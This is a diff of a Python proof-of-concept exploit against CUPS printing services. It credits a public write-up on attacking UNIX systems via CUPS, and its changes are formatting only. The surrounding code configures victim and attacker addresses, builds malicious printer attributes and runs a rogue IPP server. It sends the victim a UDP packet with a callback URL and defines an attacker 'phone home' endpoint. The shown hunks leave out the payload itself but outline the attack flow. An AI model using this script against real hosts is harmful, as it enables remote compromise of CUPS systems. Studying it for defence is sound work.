@@ -13,14 +13,14 @@ from ippserver.constants import SectionEnum, TagEnum
 # ! CREDIT IS DUE: https://www.evilsocket.net/2024/09/26/Attacking-UNIX-systems-via-CUPS-Part-I/ (amazing breakdown)
 
 victim_ip = '192.168.122.183'
-victim_port = 631 # cups UDP port
+victim_port = 631  # cups UDP port
 attacker_ip = '192.168.122.1'
-attacker_port = 8000 # IPP server (http)
-attacker_listen_ip = attacker_ip # or use '0.0.0.0'
+attacker_port = 8000  # IPP server (http)
+attacker_listen_ip = attacker_ip  # or use '0.0.0.0'
 attacker_printer_name = '192_168_122_1'
 
 attacker_ip_port = f"{attacker_ip}:{attacker_port}"
-attacker_ipp_printer = f"ipp://{attacker_ip}:{attacker_port}/printers/whatever" # TODO merge w/ ipp:// uses below once I test to validate not broken
+attacker_ipp_printer = f"ipp://{attacker_ip}:{attacker_port}/printers/whatever"  # TODO merge w/ ipp:// uses below once I test to validate not broken
 attacker_http_printer = f"http://{attacker_ip}:{attacker_port}/printers/whatever"
 attacker_phone_home = f"http://{attacker_ip}:{attacker_port}/phone/home"
 
@@ -37,7 +37,7 @@ def malicious_attributes():
     #  opposite is true on host! (printer-more-info works, printer-privacy-policy-uri doesn't)
 
     # TODO try with rolled back 2.0.0-0ubuntu10 package
-    
+
     return {
         # (SectionEnum.printer, b'printer-privacy-policy-uri', TagEnum.uri): [
         #     b"https://www.google.com"
@@ -155,11 +155,13 @@ def start_server():
     print("Starting server")
     httpd.serve_forever()
 
+
 server_thread = threading.Thread(target=start_server)
 # server_thread.daemon = True  # Allows the thread to exit when the main program does, or don't set this to just let it run indefinitely
 server_thread.start()
 
 sleep(1)
+
 
 def send_udp_packet(ip, port, message):
     print("sending")
@@ -176,7 +178,6 @@ if IMPERSONATE_PRINTER:
 
     send_udp_packet(victim_ip, victim_port, callback_url)
     print("sent")
-
 
 # commands for forcing printer readded with IPPtoPPD redone
 #
